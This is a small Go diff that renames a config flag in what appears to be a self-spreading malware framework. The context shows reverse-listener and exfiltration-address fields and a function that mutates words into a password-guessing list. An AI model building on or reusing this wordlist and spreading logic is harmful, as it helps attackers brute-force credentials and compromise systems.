@@ -51,7 +51,7 @@ type __NeuraxConfig struct {
 	ReverseListener string
 	PreventReexec   bool
 	ExfilAddr       string
-	ExpandWordlist  bool
+	WordlistExpand  bool
 }
 
 var NeuraxConfig = __NeuraxConfig{
@@ -568,7 +568,7 @@ func NeuraxWordlist(words []string) []string {
 		wordlist = append(wordlist, word+"1")
 		wordlist = append(wordlist, word+"12")
 		wordlist = append(wordlist, word+"123")
-		if NeuraxConfig.ExpandWordlist {
+		if NeuraxConfig.WordlistExpand {
 			wordlist = append(wordlist, WordEncapsule(word)...)
 			wordlist = append(wordlist, WordCyryllicReplace(word)...)
 			wordlist = append(wordlist, WordSingleUpperTransform(word)...)
